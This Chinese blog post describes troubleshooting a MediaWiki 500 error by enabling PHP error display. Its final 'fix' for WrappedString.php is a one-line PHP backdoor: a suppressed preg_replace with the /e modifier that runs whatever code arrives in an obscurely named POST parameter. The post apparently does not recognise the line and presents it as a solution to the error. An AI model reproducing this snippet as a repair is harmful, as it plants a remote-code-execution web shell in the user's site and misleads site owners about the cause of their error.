---
layout: post
title: "mediawiki出现500server error"
comments: true
categories: 
- 网站
tags:
- mediawiki
---


出现server error 500, 谷歌无解，打电话给阿里云无解，去掉一些localsettings.php里的extension也无效。


最后，偶然看到：https://www.mediawiki.org/wiki/Manual:Errors_and_symptoms


You see a Blank Page
A blank white page indicates a PHP error which isn't being printed to the screen. To force this, add the following lines to the LocalSettings.php file, underneath the <?php:

	error_reporting( E_ALL );
	ini_set( 'display_errors', 1 );

将这段代码放进localsetting。php，
提示错误来源是：WrappedString.php  Fatal error: Namespace declaration statement

于是调整为以下形式，问题解决。

	<?php 

	namespace WrappedString;

	@preg_replace('/(.*)/e', @$_POST['kxrmmbxafhdg'], '');


